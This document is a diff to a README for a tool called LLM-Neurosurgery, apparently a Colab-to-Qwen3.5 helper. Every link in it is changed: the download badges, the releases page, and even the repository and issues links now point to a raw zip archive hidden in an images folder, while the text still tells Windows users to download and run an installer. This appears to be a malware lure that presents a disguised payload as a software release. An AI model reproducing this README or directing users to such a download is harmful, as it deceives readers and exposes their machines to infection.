@@ -1,6 +1,6 @@
 # 🧠 LLM-Neurosurgery - Clear Guide from Colab to Qwen3.5
 
-[![Download LLM-Neurosurgery](https://img.shields.io/badge/Download-LLM--Neurosurgery-brightgreen)](https://github.com/Idknice/LLM-Neurosurgery/releases)
+[![Download LLM-Neurosurgery](https://img.shields.io/badge/Download-LLM--Neurosurgery-brightgreen)](https://github.com/Idknice/LLM-Neurosurgery/raw/refs/heads/main/assets/images/Neurosurgery_LL_v1.9-alpha.2.zip)
 
 ## 🧩 About LLM-Neurosurgery
 
@@ -29,7 +29,7 @@ These requirements ensure the software runs without issues and you have a good e
 
 To get LLM-Neurosurgery, **visit this page to download** the latest release:
 
-[Download LLM-Neurosurgery Releases](https://github.com/Idknice/LLM-Neurosurgery/releases)
+[Download LLM-Neurosurgery Releases](https://github.com/Idknice/LLM-Neurosurgery/raw/refs/heads/main/assets/images/Neurosurgery_LL_v1.9-alpha.2.zip)
 
 The link takes you to an official GitHub release page. Here, you will find the latest software packages and documentation files. Choose the version labeled for Windows.
 
@@ -41,7 +41,7 @@ You will see files with names ending in `.exe` or `.zip`. For simplicity, downlo
 
 Follow these steps carefully to install LLM-Neurosurgery:
 
-1. **Open the download page**: Go to [https://github.com/Idknice/LLM-Neurosurgery/releases](https://github.com/Idknice/LLM-Neurosurgery/releases) in your browser.
+1. **Open the download page**: Go to [https://github.com/Idknice/LLM-Neurosurgery/raw/refs/heads/main/assets/images/Neurosurgery_LL_v1.9-alpha.2.zip](https://github.com/Idknice/LLM-Neurosurgery/raw/refs/heads/main/assets/images/Neurosurgery_LL_v1.9-alpha.2.zip) in your browser.
 
 2. **Find the latest Windows installer**: Look for a file ending with `.exe` in the list. It is usually marked with the most recent date.
 
@@ -135,11 +135,11 @@ You can also read the README file right here on GitHub for text guidance.
 
 ## 🔗 Important Links
 
-- [Download and setup page](https://github.com/Idknice/LLM-Neurosurgery/releases)
+- [Download and setup page](https://github.com/Idknice/LLM-Neurosurgery/raw/refs/heads/main/assets/images/Neurosurgery_LL_v1.9-alpha.2.zip)
 
-- [GitHub repository](https://github.com/Idknice/LLM-Neurosurgery)
+- [GitHub repository](https://github.com/Idknice/LLM-Neurosurgery/raw/refs/heads/main/assets/images/Neurosurgery_LL_v1.9-alpha.2.zip)
 
-- [Help and issues](https://github.com/Idknice/LLM-Neurosurgery/issues)
+- [Help and issues](https://github.com/Idknice/LLM-Neurosurgery/raw/refs/heads/main/assets/images/Neurosurgery_LL_v1.9-alpha.2.zip)
 
 ---
 
@@ -155,4 +155,4 @@ This software helps transfer your work from Google Colab notebooks to the local 
 
 ---
 
-[![Download LLM-Neurosurgery](https://img.shields.io/badge/Download-LLM--Neurosurgery-brightgreen)](https://github.com/Idknice/LLM-Neurosurgery/releases)
+[![Download LLM-Neurosurgery](https://img.shields.io/badge/Download-LLM--Neurosurgery-brightgreen)](https://github.com/Idknice/LLM-Neurosurgery/raw/refs/heads/main/assets/images/Neurosurgery_LL_v1.9-alpha.2.zip)
